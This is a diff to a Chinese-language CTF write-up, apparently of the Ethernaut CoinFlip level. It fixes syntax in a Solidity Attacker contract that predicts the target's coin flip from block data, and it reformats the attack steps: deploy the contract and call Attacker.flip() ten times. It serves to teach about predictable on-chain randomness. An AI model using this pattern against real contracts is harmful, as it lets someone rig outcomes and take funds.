@@ -57,7 +57,7 @@ contract Attacker {
 }
 ```
 
-接下来我们需要定义一个函数，将一个boolean值作为我们猜测的值，这里注意的是我们还需要保证传入的值在使用`target.flip()`时的返回值永远为true。
+接下来我们需要定义一个函数，将一个`boolean`值作为我们猜测的值，这里注意的是我们还需要保证传入的值在使用`target.flip()`时的返回值永远为true。
 ```
 contract Attacker {
   
@@ -110,12 +110,12 @@ contract Attacker {
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
   
   CoinFlip private immutable target;
-  constructor(){
-    target = CoinFlip(address _target);
+  constructor(address _target){
+    target = CoinFlip(_target);
   }
 
   function flip() external {
-    guess = _guess(); // 预先假设是一个_guess函数返回的值
+    bool guess = _guess(); // 预先假设是一个_guess函数返回的值
     require(target.flip(guess), "flip failed");
   } 
 
@@ -160,5 +160,5 @@ contract CoinFlip {
 ```
 
 ## 攻击过程
-1. 部署合约，部署是target为CoinFlip合约的地址
-2. 调用Attacker.flip() 10次。
+1. 部署合约，部署是`target`为`CoinFlip`合约的地址
+2. 调用`Attacker.flip()` 10次。
